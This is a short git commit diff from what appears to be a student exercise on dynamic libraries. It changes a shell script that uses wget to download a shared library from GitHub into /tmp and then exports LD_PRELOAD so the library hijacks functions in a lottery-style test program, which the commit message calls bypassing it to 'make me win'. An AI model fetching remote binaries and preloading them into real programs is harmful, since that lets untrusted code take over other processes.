5db879b5d8d509447c5db684c96a2372246ab258
EmmanuelPriest <emmanuelchukwujekwu87@gmail.com>
2022-09-05 15:21:28 -0700

    program to byepass the Giga Millions program in order to make me win

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://github.com/EmmanuelPriest/alx-low_level_programming/raw/master/0x18-dynamic_libraries/sheetmode.so
+wget -q -O /tmp/sheetmode.so https://github.com/EmmanuelPriest/alx-low_level_programming/raw/master/0x18-dynamic_libraries/sheetmode.so
 export LD_PRELOAD=/tmp/sheetmode.so
